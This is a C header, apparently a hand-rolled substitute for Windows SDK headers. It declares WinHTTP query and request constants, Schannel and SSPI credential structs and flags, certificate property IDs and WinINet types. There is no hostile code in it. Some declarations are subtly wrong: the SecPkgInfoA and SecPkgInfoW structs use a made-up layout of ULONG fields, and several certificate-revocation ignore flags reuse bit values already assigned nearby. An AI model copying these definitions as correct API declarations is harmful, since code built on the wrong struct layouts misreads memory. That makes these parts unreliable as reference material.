#define WINHTTP_NO_PROXY_NAME               NULL
#define WINHTTP_NO_PROXY_BYPASS             NULL

#define WINHTTP_NO_CLIENT_CERT_CONTEXT      NULL

#define WINHTTP_NO_REFERER                  NULL
#define WINHTTP_DEFAULT_ACCEPT_TYPES        NULL

#define WINHTTP_NO_ADDITIONAL_HEADERS       NULL
#define WINHTTP_NO_REQUEST_DATA             NULL

#define WINHTTP_HEADER_NAME_BY_INDEX        NULL
#define WINHTTP_NO_OUTPUT_BUFFER            NULL
#define WINHTTP_NO_HEADER_INDEX             NULL

#define WINHTTP_ADDREQ_INDEX_MASK                    0x0000FFFF
#define WINHTTP_ADDREQ_FLAGS_MASK                    0xFFFF0000
#define WINHTTP_ADDREQ_FLAG_ADD_IF_NEW               0x10000000
#define WINHTTP_ADDREQ_FLAG_ADD                      0x20000000
#define WINHTTP_ADDREQ_FLAG_COALESCE_WITH_COMMA      0x40000000
#define WINHTTP_ADDREQ_FLAG_COALESCE_WITH_SEMICOLON  0x01000000
#define WINHTTP_ADDREQ_FLAG_COALESCE                 WINHTTP_ADDREQ_FLAG_COALESCE_WITH_COMMA
#define WINHTTP_ADDREQ_FLAG_REPLACE                  0x80000000

#define WINHTTP_IGNORE_REQUEST_TOTAL_LENGTH 0
  typedef struct _SecHandle {
    ULONG_PTR dwLower;
    ULONG_PTR dwUpper;
  } SecHandle,*PSecHandle;
#define SCH_CRED_MAX_STORE_NAME_SIZE 128
#define SCHANNEL_SHUTDOWN 1
  typedef SecHandle CredHandle;
  typedef PSecHandle PCredHandle;

  typedef SecHandle CtxtHandle;
  typedef PSecHandle PCtxtHandle;
  typedef struct _TimeStamp {
    LARGE_INTEGER Time;
  } TimeStamp, *PTimeStamp;

  
typedef struct _SCHANNEL_CERT_HASH {
  DWORD dwLength;
  DWORD dwFlags;
  HCRYPTPROV hProv;
  BYTE ShaHash[20];
} SCHANNEL_CERT_HASH,*PSCHANNEL_CERT_HASH;



#define SCH_MACHINE_CERT_HASH 0x00000001

#define SCH_CRED_NO_SYSTEM_MAPPER 0x00000002
#define SCH_CRED_NO_SERVERNAME_CHECK 0x00000004
#define SCH_CRED_MANUAL_CRED_VALIDATION 0x00000008
#define SCH_CRED_NO_DEFAULT_CREDS 0x00000010
#define SCH_CRED_AUTO_CRED_VALIDATION 0x00000020
#define SCH_CRED_USE_DEFAULT_CREDS 0x00000040
#define SCH_CRED_DISABLE_RECONNECTS 0x00000080

#define SCH_CRED_REVOCATION_CHECK_END_CERT 0x00000100
#define SCH_CRED_REVOCATION_CHECK_CHAIN 0x00000200
#define SCH_CRED_REVOCATION_CHECK_CHAIN_EXCLUDE_ROOT 0x00000400
#define SCH_CRED_IGNORE_NO_REVOCATION_CHECK 0x00000800
#define SCH_CRED_IGNORE_REVOCATION_OFFLINE 0x00001000

#define SCH_CRED_RESTRICTED_ROOTS 0x00002000
#define SCH_CRED_REVOCATION_CHECK_CACHE_ONLY 0x00004000
#define SCH_CRED_CACHE_ONLY_URL_RETRIEVAL 0x00008000

#define SCH_CRED_MEMORY_STORE_CERT 0x00010000

#define SCH_CRED_CACHE_ONLY_URL_RETRIEVAL_ON_CREATE 0x00020000

#define SCH_SEND_ROOT_CERT 0x00040000
#define SCH_CRED_SNI_CREDENTIAL 0x00080000
#define SCH_CRED_SNI_ENABLE_OCSP 0x00100000
#define SCH_SEND_AUX_RECORD 0x00200000
#define SCH_USE_STRONG_CRYPTO 0x00400000
#define SCH_USE_PRESHAREDKEY_ONLY 0x00800000
#define SCH_USE_DTLS_ONLY 0x01000000
#define SCH_ALLOW_NULL_ENCRYPTION 0x02000000

#define SECBUFFER_VERSION 0

#define SECBUFFER_EMPTY 0
#define SECBUFFER_DATA 1
#define SECBUFFER_TOKEN 2
#define SECBUFFER_PKG_PARAMS 3
#define SECBUFFER_MISSING 4
#define SECBUFFER_EXTRA 5
#define SECBUFFER_STREAM_TRAILER 6
#define SECBUFFER_STREAM_HEADER 7
#define SECBUFFER_NEGOTIATION_INFO 8
#define SECBUFFER_PADDING 9
#define SECBUFFER_STREAM 10
#define SECBUFFER_MECHLIST 11
#define SECBUFFER_MECHLIST_SIGNATURE 12
#define SECBUFFER_TARGET 13
#define SECBUFFER_CHANNEL_BINDINGS 14
#define SECBUFFER_CHANGE_PASS_RESPONSE 15
#define SECBUFFER_TARGET_HOST 16
#define SECBUFFER_ALERT 17
#define SECBUFFER_APPLICATION_PROTOCOLS 18
#define SECBUFFER_SRTP_PROTECTION_PROFILES 19
#define SECBUFFER_SRTP_MASTER_KEY_IDENTIFIER 20
#define SECBUFFER_TOKEN_BINDING 21
#define SECBUFFER_PRESHARED_KEY 22
#define SECBUFFER_PRESHARED_KEY_IDENTITY 23
#define SECBUFFER_DTLS_MTU 24
#define SECBUFFER_SEND_GENERIC_TLS_EXTENSION 25
#define SECBUFFER_SUBSCRIBE_GENERIC_TLS_EXTENSION 26
#define SECBUFFER_FLAGS 27
#define SECBUFFER_TRAFFIC_SECRETS 28

#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID    0x00001000
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID  0x00002000
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA         0x00000100
#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE   0x00000200
#define SECURITY_FLAG_IGNORE_CERT_REVOCATION    0x00000400
#define SECURITY_FLAG_IGNORE_CERT_REVOCATION_STATUS_UNKNOWN 0x00000800
#define SECURITY_FLAG_IGNORE_CERT_REVOCATION_STATUS_UNKNOWN_BY_CERT 0x00001000
#define SECURITY_FLAG_IGNORE_CERT_REVOCATION_STATUS_UNKNOWN_BY_OCSP 0x00002000
#define SECURITY_FLAG_IGNORE_CERT_REVOCATION_STATUS_UNKNOWN_BY_CRL 0x00004000

typedef struct _SCHANNEL_CRED {
  DWORD dwVersion;
  DWORD cCreds;
  PCCERT_CONTEXT *paCred;
  HCERTSTORE hRootStore;
  DWORD cMappers;
  struct _HMAPPER **aphMappers;
  DWORD cSupportedAlgs;
  ALG_ID *palgSupportedAlgs;
  DWORD grbitEnabledProtocols;
  DWORD dwMinimumCipherStrength;
  DWORD dwMaximumCipherStrength;
  DWORD dwSessionLifespan;
  DWORD dwFlags;
  DWORD dwCredFormat;
} SCHANNEL_CRED,*PSCHANNEL_CRED;
typedef enum _eTlsAlgorithmUsage {
  TlsParametersCngAlgUsageKeyExchange,
  TlsParametersCngAlgUsageSignature,
  TlsParametersCngAlgUsageCipher,
  TlsParametersCngAlgUsageDigest,
  TlsParametersCngAlgUsageCertSig
} eTlsAlgorithmUsage;

typedef struct _CRYPTO_SETTINGS {
  eTlsAlgorithmUsage eAlgorithmUsage;
  UNICODE_STRING strCngAlgId;
  DWORD cChainingModes;
  PUNICODE_STRING rgstrChainingModes;
  DWORD dwMinBitLength;
  DWORD dwMaxBitLength;
} CRYPTO_SETTINGS, *PCRYPTO_SETTINGS;

typedef struct _TLS_PARAMETERS {
  DWORD cAlpnIds;
  PUNICODE_STRING rgstrAlpnIds;
  DWORD grbitDisabledProtocols;
  DWORD cDisabledCrypto;
  PCRYPTO_SETTINGS pDisabledCrypto;
  DWORD dwFlags;
} TLS_PARAMETERS, *PTLS_PARAMETERS;

#define TLS_PARAMS_OPTIONAL 0x00000001

typedef struct _SCH_CREDENTIALS {
  DWORD dwVersion;
  DWORD dwCredFormat;
  DWORD cCreds;
  PCCERT_CONTEXT *paCred;
  HCERTSTORE hRootStore;
  DWORD cMappers;
  struct _HMAPPER **aphMappers;
  DWORD dwSessionLifespan;
  DWORD dwFlags;
  DWORD cTlsParameters;
  PTLS_PARAMETERS pTlsParameters;
} SCH_CREDENTIALS, *PSCH_CREDENTIALS;

#define SCH_CRED_MAX_SUPPORTED_PARAMETERS 16
#define SCH_CRED_MAX_SUPPORTED_ALPN_IDS 16
#define SCH_CRED_MAX_SUPPORTED_CRYPTO_SETTINGS 16
#define SCH_CRED_MAX_SUPPORTED_CHAINING_MODES 16
#define SCH_CRED_FORMAT_CERT_CONTEXT 0x00000000
#define SCH_CRED_FORMAT_CERT_HASH 0x00000001
#define SCH_CRED_FORMAT_CERT_HASH_STORE 0x00000002

#define SCH_CRED_MAX_SUPPORTED_ALGS 256
#define SCH_CRED_MAX_SUPPORTED_CERTS 100
#define SP_PROT_TLS1_2_CLIENT 0x00000800
#define SCHANNEL_CRED_VERSION 0x00000004
#define SECURITY_NATIVE_DREP 0x00000010

#define UNISP_NAME_A "Microsoft Unified Security Protocol Provider"
#define UNISP_NAME_W L"Microsoft Unified Security Protocol Provider"
#define UNISP_NAME __MINGW_NAME_UAW(UNISP_NAME)

#define SECPKG_ATTR_STREAM_SIZES 4
  typedef struct _SecPkgInfoA {
    ULONG fCapabilities;
    ULONG wVersion;
    ULONG wRPCID;
    ULONG cbMaxToken;
    ULONG Name;
    ULONG MaxToken;
    ULONG Attributes;
    ULONG TargetName;
    ULONG TargetInfo;
    ULONG AltKeysetName;
    ULONG AltKeyset;
    ULONG Capabilities;
    ULONG Reserved;
  } SecPkgInfoA,*PSecPkgInfoA;

  typedef struct _SecPkgInfoW {
    ULONG fCapabilities;
    ULONG wVersion;
    ULONG wRPCID;
    ULONG cbMaxToken;
    ULONG Name;
    ULONG MaxToken;
    ULONG Attributes;
    ULONG TargetName;
    ULONG TargetInfo;
    ULONG AltKeysetName;
    ULONG AltKeyset;
    ULONG Capabilities;
    ULONG Reserved;
  } SecPkgInfoW,*PSecPkgInfoW;

  typedef struct _SecBuffer {
    ULONG cbBuffer;
    ULONG BufferType;
    PVOID pvBuffer;
  } SecBuffer,*PSecBuffer;

  typedef struct _SecBufferDesc {
    ULONG ulVersion;
    ULONG cBuffers;
    PSecBuffer pBuffers;
  } SecBufferDesc,*PSecBufferDesc;

typedef unsigned __int64 QWORD;
  typedef QWORD SECURITY_INTEGER,*PSECURITY_INTEGER;
#define SEC_SUCCESS(Status) ((Status) >= 0)

#ifndef SEC_E_OK
    #define SEC_E_OK ((SECURITY_STATUS)0x00000000L)
#endif

typedef CHAR SEC_CHAR;
typedef WCHAR SEC_WCHAR;
#define SECURITY_NETWORK_DREP 0x00000000

#define SECPKG_CRED_INBOUND 0x00000001
#define SECPKG_CRED_OUTBOUND 0x00000002
#define SECPKG_CRED_BOTH 0x00000003
#define SECPKG_CRED_DEFAULT 0x00000004
#define SECPKG_CRED_RESERVED 0xF0000000

#define SECPKG_CRED_AUTOLOGON_RESTRICTED 0x00000010
#define SECPKG_CRED_PROCESS_POLICY_ONLY 0x00000020

#define ISC_REQ_DELEGATE 0x00000001
#define ISC_REQ_MUTUAL_AUTH 0x00000002
#define ISC_REQ_REPLAY_DETECT 0x00000004
#define ISC_REQ_SEQUENCE_DETECT 0x00000008
#define ISC_REQ_CONFIDENTIALITY 0x00000010
#define ISC_REQ_USE_SESSION_KEY 0x00000020
#define ISC_REQ_PROMPT_FOR_CREDS 0x00000040
#define ISC_REQ_USE_SUPPLIED_CREDS 0x00000080
#define ISC_REQ_ALLOCATE_MEMORY 0x00000100
#define ISC_REQ_USE_DCE_STYLE 0x00000200
#define ISC_REQ_DATAGRAM 0x00000400
#define ISC_REQ_CONNECTION 0x00000800
#define ISC_REQ_CALL_LEVEL 0x00001000
#define ISC_REQ_FRAGMENT_SUPPLIED 0x00002000
#define ISC_REQ_EXTENDED_ERROR 0x00004000
#define ISC_REQ_STREAM 0x00008000
#define ISC_REQ_INTEGRITY 0x00010000
#define ISC_REQ_IDENTIFY 0x00020000
#define ISC_REQ_NULL_SESSION 0x00040000
#define ISC_REQ_MANUAL_CRED_VALIDATION 0x00080000
#define ISC_REQ_RESERVED1 0x00100000
#define ISC_REQ_FRAGMENT_TO_FIT 0x00200000
#define ISC_REQ_FORWARD_CREDENTIALS 0x00400000
#define ISC_REQ_NO_INTEGRITY 0x00800000
#define ISC_REQ_USE_HTTP_STYLE 0x01000000
#define ISC_REQ_UNVERIFIED_TARGET_NAME 0x20000000
#define ISC_REQ_CONFIDENTIALITY_ONLY 0x40000000
#define ISC_REQ_MESSAGES 0x0000000100000000

#define ISC_RET_DELEGATE 0x00000001
#define ISC_RET_MUTUAL_AUTH 0x00000002
#define ISC_RET_REPLAY_DETECT 0x00000004
#define ISC_RET_SEQUENCE_DETECT 0x00000008
#define ISC_RET_CONFIDENTIALITY 0x00000010
#define ISC_RET_USE_SESSION_KEY 0x00000020
#define ISC_RET_USED_COLLECTED_CREDS 0x00000040
#define ISC_RET_USED_SUPPLIED_CREDS 0x00000080
#define ISC_RET_ALLOCATED_MEMORY 0x00000100
#define ISC_RET_USED_DCE_STYLE 0x00000200
#define ISC_RET_DATAGRAM 0x00000400
#define ISC_RET_CONNECTION 0x00000800
#define ISC_RET_INTERMEDIATE_RETURN 0x00001000
#define ISC_RET_CALL_LEVEL 0x00002000
#define ISC_RET_EXTENDED_ERROR 0x00004000
#define ISC_RET_STREAM 0x00008000
#define ISC_RET_INTEGRITY 0x00010000
#define ISC_RET_IDENTIFY 0x00020000
#define ISC_RET_NULL_SESSION 0x00040000
#define ISC_RET_MANUAL_CRED_VALIDATION 0x00080000
#define ISC_RET_RESERVED1 0x00100000
#define ISC_RET_FRAGMENT_ONLY 0x00200000
#define ISC_RET_FORWARD_CREDENTIALS 0x00400000
#define ISC_RET_USED_HTTP_STYLE 0x01000000
#define ISC_RET_NO_ADDITIONAL_TOKEN 0x02000000
#define ISC_RET_REAUTHENTICATION 0x08000000
#define ISC_RET_CONFIDENTIALITY_ONLY 0x40000000
#define ISC_RET_MESSAGES 0x0000000100000000

#define ASC_REQ_DELEGATE 0x00000001
#define ASC_REQ_MUTUAL_AUTH 0x00000002
#define ASC_REQ_REPLAY_DETECT 0x00000004
#define ASC_REQ_SEQUENCE_DETECT 0x00000008
#define ASC_REQ_CONFIDENTIALITY 0x00000010
#define ASC_REQ_USE_SESSION_KEY 0x00000020
#define ASC_REQ_SESSION_TICKET 0x00000040
#define ASC_REQ_ALLOCATE_MEMORY 0x00000100
#define ASC_REQ_USE_DCE_STYLE 0x00000200
#define ASC_REQ_DATAGRAM 0x00000400
#define ASC_REQ_CONNECTION 0x00000800
#define ASC_REQ_CALL_LEVEL 0x00001000
#define ASC_REQ_FRAGMENT_SUPPLIED 0x00002000
#define ASC_REQ_EXTENDED_ERROR 0x00008000
#define ASC_REQ_STREAM 0x00010000
#define ASC_REQ_INTEGRITY 0x00020000
#define ASC_REQ_LICENSING 0x00040000
#define ASC_REQ_IDENTIFY 0x00080000
#define ASC_REQ_ALLOW_NULL_SESSION 0x00100000
#define ASC_REQ_ALLOW_NON_USER_LOGONS 0x00200000
#define ASC_REQ_ALLOW_CONTEXT_REPLAY 0x00400000
#define ASC_REQ_FRAGMENT_TO_FIT 0x00800000
#define ASC_REQ_NO_TOKEN 0x01000000
#define ASC_REQ_PROXY_BINDINGS 0x04000000
#define ASC_REQ_ALLOW_MISSING_BINDINGS 0x10000000
#define ASC_REQ_MESSAGES 0x0000000100000000

#define ASC_RET_DELEGATE 0x00000001
#define ASC_RET_MUTUAL_AUTH 0x00000002
#define ASC_RET_REPLAY_DETECT 0x00000004
#define ASC_RET_SEQUENCE_DETECT 0x00000008
#define ASC_RET_CONFIDENTIALITY 0x00000010
#define ASC_RET_USE_SESSION_KEY 0x00000020
#define ASC_RET_SESSION_TICKET 0x00000040
#define ASC_RET_ALLOCATED_MEMORY 0x00000100
#define ASC_RET_USED_DCE_STYLE 0x00000200
#define ASC_RET_DATAGRAM 0x00000400
#define ASC_RET_CONNECTION 0x00000800
#define ASC_RET_CALL_LEVEL 0x00002000
#define ASC_RET_THIRD_LEG_FAILED 0x00004000
#define ASC_RET_EXTENDED_ERROR 0x00008000
#define ASC_RET_STREAM 0x00010000
#define ASC_RET_INTEGRITY 0x00020000
#define ASC_RET_LICENSING 0x00040000
#define ASC_RET_IDENTIFY 0x00080000
#define ASC_RET_NULL_SESSION 0x00100000
#define ASC_RET_ALLOW_NON_USER_LOGONS 0x00200000
#define ASC_RET_ALLOW_CONTEXT_REPLAY 0x00400000
#define ASC_RET_FRAGMENT_ONLY 0x00800000
#define ASC_RET_NO_TOKEN 0x01000000
#define ASC_RET_NO_ADDITIONAL_TOKEN 0x02000000
#define ASC_RET_MESSAGES 0x0000000100000000

#define SECPKG_CRED_ATTR_NAMES 1
#define SECPKG_CRED_ATTR_SSI_PROVIDER 2
#define SECPKG_CRED_ATTR_KDC_PROXY_SETTINGS 3
#define SECPKG_CRED_ATTR_CERT 4
#define SECPKG_CRED_ATTR_PAC_BYPASS 5
typedef struct _SecPkgContext_Sizes {
    unsigned long cbMaxToken;
    unsigned long cbMaxSignature;
    unsigned long cbBlockSize;
    unsigned long cbSecurityTrailer;
} SecPkgContext_Sizes,*PSecPkgContext_Sizes;

typedef struct _SecPkgContext_StreamSizes {
    unsigned long cbHeader;
    unsigned long cbTrailer;
    unsigned long cbMaximumMessage;
    unsigned long cBuffers;
    unsigned long cbBlockSize;
} SecPkgContext_StreamSizes,*PSecPkgContext_StreamSizes;

/* Certificates */
#ifndef __WINCRYPT_H__
  typedef void *HCERTSTORE;

  typedef struct _CERT_CONTEXT {
    DWORD dwCertEncodingType;
    BYTE *pbCertEncoded;
    DWORD cbCertEncoded;
    PCERT_INFO pCertInfo;
    HCERTSTORE hCertStore;
  } CERT_CONTEXT,*PCERT_CONTEXT;

  typedef const CERT_CONTEXT *PCCERT_CONTEXT;

  typedef struct _CRL_CONTEXT {
    DWORD dwCertEncodingType;
    BYTE *pbCrlEncoded;
    DWORD cbCrlEncoded;
    PCRL_INFO pCrlInfo;
    HCERTSTORE hCertStore;
  } CRL_CONTEXT,*PCRL_CONTEXT;

  typedef const CRL_CONTEXT *PCCRL_CONTEXT;

  typedef struct _CTL_CONTEXT {
    DWORD dwMsgAndCertEncodingType;
    BYTE *pbCtlEncoded;
    DWORD cbCtlEncoded;
    PCTL_INFO pCtlInfo;
    HCERTSTORE hCertStore;
    HCRYPTMSG hCryptMsg;
    BYTE *pbCtlContent;
    DWORD cbCtlContent;
  } CTL_CONTEXT,*PCTL_CONTEXT;

  typedef const CTL_CONTEXT *PCCTL_CONTEXT;
  #define CALG_SHA_256 0x0000800c
  #define CERT_ENHKEY_USAGE_PROP_ID 9
  #define CERT_CTL_USAGE_PROP_ID CERT_ENHKEY_USAGE_PROP_ID
  #define CERT_NEXT_UPDATE_LOCATION_PROP_ID 10
  #define CERT_FRIENDLY_NAME_PROP_ID 11
  #define CERT_PVK_FILE_PROP_ID 12
  #define CERT_DESCRIPTION_PROP_ID 13
  #define CERT_ACCESS_STATE_PROP_ID 14
  #define CERT_SIGNATURE_HASH_PROP_ID 15
  #define CERT_SMART_CARD_DATA_PROP_ID 16
  #define CERT_EFS_PROP_ID 17
  #define CERT_FORTEZZA_DATA_PROP_ID 18
  #define CERT_ARCHIVED_PROP_ID 19
  #define CERT_KEY_IDENTIFIER_PROP_ID 20
  #define CERT_AUTO_ENROLL_PROP_ID 21
  #define CERT_PUBKEY_ALG_PARA_PROP_ID 22
  #define CERT_CROSS_CERT_DIST_POINTS_PROP_ID 23
  #define CERT_ISSUER_PUBLIC_KEY_MD5_HASH_PROP_ID 24
  #define CERT_SUBJECT_PUBLIC_KEY_MD5_HASH_PROP_ID 25
  #define CERT_ENROLLMENT_PROP_ID 26
  #define CERT_DATE_STAMP_PROP_ID 27
  #define CERT_ISSUER_SERIAL_NUMBER_MD5_HASH_PROP_ID 28
  #define CERT_SUBJECT_NAME_MD5_HASH_PROP_ID 29
  #define CERT_EXTENDED_ERROR_INFO_PROP_ID 30
  #define CERT_RENEWAL_PROP_ID 64
  #define CERT_ARCHIVED_KEY_HASH_PROP_ID 65
  #define CERT_AUTO_ENROLL_RETRY_PROP_ID 66
  #define CERT_AIA_URL_RETRIEVED_PROP_ID 67
  #define CERT_AUTHORITY_INFO_ACCESS_PROP_ID 68
  #define CERT_BACKED_UP_PROP_ID 69
  #define CERT_OCSP_RESPONSE_PROP_ID 70
  #define CERT_REQUEST_ORIGINATOR_PROP_ID 71
  #define CERT_SOURCE_LOCATION_PROP_ID 72
  #define CERT_SOURCE_URL_PROP_ID 73
  #define CERT_NEW_KEY_PROP_ID 74
  #define CERT_OCSP_CACHE_PREFIX_PROP_ID 75
  #define CERT_SMART_CARD_ROOT_INFO_PROP_ID 76
  #define CERT_NO_AUTO_EXPIRE_CHECK_PROP_ID 77
  #define CERT_NCRYPT_KEY_HANDLE_PROP_ID 78
  #define CERT_HCRYPTPROV_OR_NCRYPT_KEY_HANDLE_PROP_ID 79
  #define CERT_SUBJECT_INFO_ACCESS_PROP_ID 80
  #define CERT_CA_OCSP_AUTHORITY_INFO_ACCESS_PROP_ID 81
  #define CERT_CA_DISABLE_CRL_PROP_ID 82
  #define CERT_ROOT_PROGRAM_CERT_POLICIES_PROP_ID 83
  #define CERT_ROOT_PROGRAM_NAME_CONSTRAINTS_PROP_ID 84
  #define CERT_SUBJECT_OCSP_AUTHORITY_INFO_ACCESS_PROP_ID 85
  #define CERT_SUBJECT_DISABLE_CRL_PROP_ID 86
  #define CERT_CEP_PROP_ID 87
  #define CERT_SIGN_HASH_CNG_ALG_PROP_ID 89
  #define CERT_SCARD_PIN_ID_PROP_ID 90
  #define CERT_SCARD_PIN_INFO_PROP_ID 91
  #define CERT_SUBJECT_PUB_KEY_BIT_LENGTH_PROP_ID 92
  #define CERT_PUB_KEY_CNG_ALG_BIT_LENGTH_PROP_ID 93
  #define CERT_ISSUER_PUB_KEY_BIT_LENGTH_PROP_ID 94
  #define CERT_ISSUER_CHAIN_SIGN_HASH_CNG_ALG_PROP_ID 95
  #define CERT_ISSUER_CHAIN_PUB_KEY_CNG_ALG_BIT_LENGTH_PROP_ID 96
  #define CERT_NO_EXPIRE_NOTIFICATION_PROP_ID 97
  #define CERT_AUTH_ROOT_SHA256_HASH_PROP_ID 98
  #define CERT_NCRYPT_KEY_HANDLE_TRANSFER_PROP_ID 99
  #define CERT_HCRYPTPROV_TRANSFER_PROP_ID 100
  #define CERT_SMART_CARD_READER_PROP_ID 101
  #define CERT_SEND_AS_TRUSTED_ISSUER_PROP_ID 102
  #define CERT_KEY_REPAIR_ATTEMPTED_PROP_ID 103
  #define CERT_DISALLOWED_FILETIME_PROP_ID 104
  #define CERT_ROOT_PROGRAM_CHAIN_POLICIES_PROP_ID 105
  #define CERT_SMART_CARD_READER_NON_REMOVABLE_PROP_ID 106

  #define CERT_SHA256_HASH_PROP_ID 107
  #define CRYPT_STRING_BASE64HEADER 0x0
  #define CRYPT_STRING_BASE64 0x1
  #define CRYPT_STRING_BINARY 0x2
  #define CRYPT_STRING_BASE64REQUESTHEADER 0x00000003
  #define CRYPT_STRING_HEX 0x4
  #define CRYPT_STRING_HEXASCII 0x00000005
  #define CRYPT_STRING_BASE64_ANY 0x00000006
  #define CRYPT_STRING_ANY 0x00000007
  #define CRYPT_STRING_HEX_ANY 0x8
  #define CRYPT_STRING_BASE64X509CRLHEADER 0x00000009
  #define CRYPT_STRING_HEXADDR 0x0000000a
  #define CRYPT_STRING_HEXASCIIADDR 0x0000000b
  #define CRYPT_STRING_HEXRAW 0x0000000c
  #define CRYPT_STRING_BASE64URI 0x0000000d

  #define CRYPT_STRING_ENCODEMASK 0x000000ff
  #define CRYPT_STRING_RESERVED100 0x00000100
  #define CRYPT_STRING_RESERVED200 0x00000200

  #define CRYPT_STRING_PERCENTESCAPE 0x08000000
  #define CRYPT_STRING_HASHDATA 0x10000000
  #define CRYPT_STRING_STRICT 0x20000000
  #define CRYPT_STRING_NOCRLF 0x40000000
  #define CRYPT_STRING_NOCR 0x80000000
#endif

#define SECPKG_ATTR_REMOTE_CERT_CONTEXT 83
#define INTERNET_ERROR_MASK_INSERT_CDROM 0x1
#define INTERNET_ERROR_MASK_COMBINED_SEC_CERT 0x2
#define INTERNET_ERROR_MASK_NEED_MSN_SSPI_PKG 0X4
#define INTERNET_ERROR_MASK_LOGIN_FAILURE_DISPLAY_ENTITY_BODY 0x8

#define INTERNET_OPTIONS_MASK (~INTERNET_FLAGS_MASK)

#define WININET_API_FLAG_ASYNC 0x00000001
#define WININET_API_FLAG_SYNC 0x00000004
#define WININET_API_FLAG_USE_CONTEXT 0x00000008

#define INTERNET_NO_CALLBACK 0

  typedef enum {
    INTERNET_SCHEME_PARTIAL = -2,INTERNET_SCHEME_UNKNOWN = -1,INTERNET_SCHEME_DEFAULT = 0,INTERNET_SCHEME_FTP,INTERNET_SCHEME_GOPHER,

    INTERNET_SCHEME_HTTP,INTERNET_SCHEME_HTTPS,INTERNET_SCHEME_FILE,INTERNET_SCHEME_NEWS,INTERNET_SCHEME_MAILTO,INTERNET_SCHEME_SOCKS
,
    INTERNET_SCHEME_JAVASCRIPT,INTERNET_SCHEME_VBSCRIPT,INTERNET_SCHEME_RES,INTERNET_SCHEME_FIRST = INTERNET_SCHEME_FTP,
    INTERNET_SCHEME_LAST = INTERNET_SCHEME_RES
  } INTERNET_SCHEME,*LPINTERNET_SCHEME;

  typedef struct {
    DWORD_PTR dwResult;
    DWORD dwError;
  } INTERNET_ASYNC_RESULT,*LPINTERNET_ASYNC_RESULT;

  typedef struct {
    DWORD_PTR Socket;
    DWORD SourcePort;
    DWORD DestPort;
    DWORD Flags;
  } INTERNET_DIAGNOSTIC_SOCKET_INFO,*LPINTERNET_DIAGNOSTIC_SOCKET_INFO;

#define IDSI_FLAG_KEEP_ALIVE 0x00000001
#define IDSI_FLAG_SECURE 0x00000002
#define IDSI_FLAG_PROXY 0x00000004
#define IDSI_FLAG_TUNNEL 0x00000008

  typedef struct {
    DWORD dwAccessType;
    LPCTSTR lpszProxy;
    LPCTSTR lpszProxyBypass;
  } INTERNET_PROXY_INFO,*LPINTERNET_PROXY_INFO;

  typedef struct {
    DWORD dwOption;
    union {
      DWORD dwValue;
      LPSTR pszValue;
      FILETIME ftValue;
    } Value;
  } INTERNET_PER_CONN_OPTIONA,*LPINTERNET_PER_CONN_OPTIONA;

  typedef struct {
    DWORD dwOption;
    union {
      DWORD dwValue;
      LPWSTR pszValue;
      FILETIME ftValue;
    } Value;
  } INTERNET_PER_CONN_OPTIONW,*LPINTERNET_PER_CONN_OPTIONW;


  
#define WINHTTP_QUERY_MIME_VERSION                 0
#define WINHTTP_QUERY_CONTENT_TYPE                 1
#define WINHTTP_QUERY_CONTENT_TRANSFER_ENCODING    2
#define WINHTTP_QUERY_CONTENT_ID                   3
#define WINHTTP_QUERY_CONTENT_DESCRIPTION          4
#define WINHTTP_QUERY_CONTENT_LENGTH               5
#define WINHTTP_QUERY_CONTENT_LANGUAGE             6
#define WINHTTP_QUERY_ALLOW                        7
#define WINHTTP_QUERY_PUBLIC                       8
#define WINHTTP_QUERY_DATE                         9
#define WINHTTP_QUERY_EXPIRES                      10
#define WINHTTP_QUERY_LAST_MODIFIED                11
#define WINHTTP_QUERY_MESSAGE_ID                   12
#define WINHTTP_QUERY_URI                          13
#define WINHTTP_QUERY_DERIVED_FROM                 14
#define WINHTTP_QUERY_COST                         15
#define WINHTTP_QUERY_LINK                         16
#define WINHTTP_QUERY_PRAGMA                       17
#define WINHTTP_QUERY_VERSION                      18
#define WINHTTP_QUERY_STATUS_CODE                  19
#define WINHTTP_QUERY_STATUS_TEXT                  20
#define WINHTTP_QUERY_RAW_HEADERS                  21
#define WINHTTP_QUERY_RAW_HEADERS_CRLF             22
#define WINHTTP_QUERY_CONNECTION                   23
#define WINHTTP_QUERY_ACCEPT                       24
#define WINHTTP_QUERY_ACCEPT_CHARSET               25
#define WINHTTP_QUERY_ACCEPT_ENCODING              26
#define WINHTTP_QUERY_ACCEPT_LANGUAGE              27
#define WINHTTP_QUERY_AUTHORIZATION                28
#define WINHTTP_QUERY_CONTENT_ENCODING             29
#define WINHTTP_QUERY_FORWARDED                    30
#define WINHTTP_QUERY_FROM                         31
#define WINHTTP_QUERY_IF_MODIFIED_SINCE            32
#define WINHTTP_QUERY_LOCATION                     33
#define WINHTTP_QUERY_ORIG_URI                     34
#define WINHTTP_QUERY_REFERER                      35
#define WINHTTP_QUERY_RETRY_AFTER                  36
#define WINHTTP_QUERY_SERVER                       37
#define WINHTTP_QUERY_TITLE                        38
#define WINHTTP_QUERY_USER_AGENT                   39
#define WINHTTP_QUERY_WWW_AUTHENTICATE             40
#define WINHTTP_QUERY_PROXY_AUTHENTICATE           41
#define WINHTTP_QUERY_ACCEPT_RANGES                42
#define WINHTTP_QUERY_SET_COOKIE                   43
#define WINHTTP_QUERY_COOKIE                       44
#define WINHTTP_QUERY_REQUEST_METHOD               45
#define WINHTTP_QUERY_REFRESH                      46
#define WINHTTP_QUERY_CONTENT_DISPOSITION          47
#define WINHTTP_QUERY_AGE                          48
#define WINHTTP_QUERY_CACHE_CONTROL                49
#define WINHTTP_QUERY_CONTENT_BASE                 50
#define WINHTTP_QUERY_CONTENT_LOCATION             51
#define WINHTTP_QUERY_CONTENT_MD5                  52
#define WINHTTP_QUERY_CONTENT_RANGE                53
#define WINHTTP_QUERY_ETAG                         54
#define WINHTTP_QUERY_HOST                         55
#define WINHTTP_QUERY_IF_MATCH                     56
#define WINHTTP_QUERY_IF_NONE_MATCH                57
#define WINHTTP_QUERY_IF_RANGE                     58
#define WINHTTP_QUERY_IF_UNMODIFIED_SINCE          59
#define WINHTTP_QUERY_MAX_FORWARDS                 60
#define WINHTTP_QUERY_PROXY_AUTHORIZATION          61
#define WINHTTP_QUERY_RANGE                        62
#define WINHTTP_QUERY_TRANSFER_ENCODING            63
#define WINHTTP_QUERY_UPGRADE                      64
#define WINHTTP_QUERY_VARY                         65
#define WINHTTP_QUERY_VIA                          66
#define WINHTTP_QUERY_WARNING                      67
#define WINHTTP_QUERY_EXPECT                       68
